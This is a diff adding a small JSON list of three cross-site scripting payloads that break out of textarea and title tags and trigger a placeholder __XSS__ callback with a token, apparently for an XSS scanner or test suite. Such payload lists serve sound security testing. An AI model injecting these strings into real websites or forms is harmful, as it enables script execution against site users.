@@ -1,0 +1,5 @@
+[
+  "</textarea><svg onload=__XSS__('{{TOKEN}}')>",
+  "</textarea><img src=x onerror=__XSS__('{{TOKEN}}')>",
+  "</title><svg onload=__XSS__('{{TOKEN}}')>"
+]
